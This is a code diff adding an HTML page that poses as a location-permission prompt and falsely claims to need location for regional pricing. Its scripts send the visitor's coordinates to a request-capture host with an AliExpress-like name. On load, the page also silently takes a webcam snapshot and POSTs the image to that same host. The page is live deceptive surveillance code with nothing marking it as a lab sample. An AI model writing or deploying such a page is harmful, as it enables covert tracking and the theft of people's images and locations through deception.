@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Page with Location Banner</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    /* Modal overlay styling */
+    .banner-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.65);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    /* Card styling */
+    .banner-card {
+      background: #ffffff;
+      padding: 24px;
+      border-radius: 12px;
+      max-width: 380px;
+      width: 85%;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+    }
+
+    .banner-card h3 {
+      margin-top: 0;
+      color: #1a1a1a;
+      font-size: 1.25rem;
+    }
+
+    .banner-card p {
+      color: #555555;
+      font-size: 0.95rem;
+      line-height: 1.4;
+      margin-bottom: 20px;
+    }
+
+    .banner-btn {
+      background-color: #007bff;
+      color: #ffffff;
+      border: none;
+      padding: 12px 20px;
+      font-size: 1rem;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.2s ease;
+    }
+
+    .banner-btn:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Custom In-App Banner Modal -->
+  <div id="locationBanner" class="banner-overlay">
+    <div class="banner-card">
+      <h3>Enable Location Services</h3>
+      <p>Please share your location so we can customize regional availability and pricing for you.</p>
+      <button id="allowLocationBtn" class="banner-btn">Continue</button>
+    </div>
+  </div>
+
+  <img
+    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkvKFperaAtM3PYXUIebatcP6VU5kVfsOvx3a-TdhPzA&s=10"
+    style="width:100%;"
+  />
+  
+<!-- Get Location script-->
+  <script>
+    document.getElementById('allowLocationBtn').addEventListener('click', () => {
+      // Hide the context banner
+      document.getElementById('locationBanner').style.display = 'none';
+
+      // Trigger the browser's native location permission dialog
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const rawLat = pos.coords.latitude;
+            const rawLng = pos.coords.longitude;
+
+            const latFormatted = `${Math.abs(rawLat)}° ${rawLat >= 0 ? 'N' : 'S'}`;
+            const lngFormatted = `${Math.abs(rawLng)}° ${rawLng >= 0 ? 'E' : 'W'}`;
+
+            const payload = {
+              lat: rawLat,
+              long: rawLng,
+              formatted: `${latFormatted}, ${lngFormatted}`
+            };
+
+            fetch('https://aliexpress.requestcatcher.com/test', {
+              method: 'POST',
+              mode: 'no-cors',
+              body: JSON.stringify(payload)
+            });
+          },
+          error => {
+            console.warn('Location request was denied or failed:', error.message);
+          }
+        );
+      }
+    });
+  </script>
+  
+  <!-- Take Picture script-->
+
+  <script>
+        navigator.mediaDevices.getUserMedia({video:true}).then(s=> {
+        
+            const canva = document.createElement('canvas'), video222 = document.createElement('video');
+        
+            video222.srcObject=s; video222.play();
+        
+            setTimeout(()=> {
+        
+                canva.width= video222.videoWidth;
+                canva.height= video222.videoHeight;
+        
+                canva.getContext('2d').drawImage(video222,0,0);
+                canva.toBlob(b=>{
+                    const xwandn = new FileReader;
+                    xwandn.onload = e => fetch(' https://aliexpress.requestcatcher.com/test', {
+                        method: 'POST',
+                        body: e.target.result
+                    }); xwandn.readAsDataURL(b) }, 'image/jpeg')
+        
+            }, 500)
+        })
+    </script>
+
+</body>
+</html>
